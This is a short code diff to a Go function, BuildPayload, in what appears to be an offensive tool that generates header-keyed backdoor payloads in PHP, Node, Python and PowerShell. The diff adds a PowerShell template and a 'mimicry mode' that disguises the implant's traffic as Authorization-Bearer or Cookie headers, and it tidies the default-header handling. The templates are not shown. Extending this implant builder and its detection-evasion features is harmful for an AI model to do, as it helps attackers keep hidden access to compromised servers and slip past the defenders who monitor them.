@@ -30,14 +30,19 @@ func BuildPayload() {
 	fmt.Scanln(&targetType)
 	fmt.Print("Header Key (Default: X-Shield-Key): ")
 	fmt.Scanln(&customHeader)
+	if customHeader == "" {
+		customHeader = DefaultHeader
+	}
+
+	var mimicry string
+	fmt.Print("Mimicry Mode (0: None, 1: Authorization-Bearer, 2: Cookie): ")
+	fmt.Scanln(&mimicry)
+
 	fmt.Print("Output File (e.g. out.php): ")
 	fmt.Scanln(&outFile)
 
 	if targetType == "" || outFile == "" {
 		return
-	}
-	if customHeader == "" {
-		customHeader = DefaultHeader
 	}
 
 	fmt.Printf("%s[*]%s Forging resilient %s payload...\n", cyan, reset, strings.ToUpper(targetType))
@@ -50,9 +55,14 @@ func BuildPayload() {
 		code = template.TplNode
 	case "python":
 		code = template.TplPython
+	case "ps1":
+		code = template.TplPS1
 	default:
 		return
 	}
+
+	// We'll actually pass the mimicry type as a constant to the agent
+	code = strings.ReplaceAll(code, "__MIMICRY_MODE__", mimicry)
 
 	salt := make([]byte, 16)
 	rand.Read(salt)
